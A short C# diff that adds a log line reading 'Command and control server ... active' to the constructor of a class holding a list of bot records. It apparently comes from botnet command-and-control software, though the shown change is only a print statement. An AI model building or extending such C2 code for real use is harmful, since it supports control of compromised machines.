@@ -27,6 +27,7 @@ namespace CNC
             this.m1 = new Mutex();
             this.name = name;
             this.lst = new List<botInfo>();
+            Console.WriteLine("Command and control server {0} active",this.name);
         }
 
         public void listen()
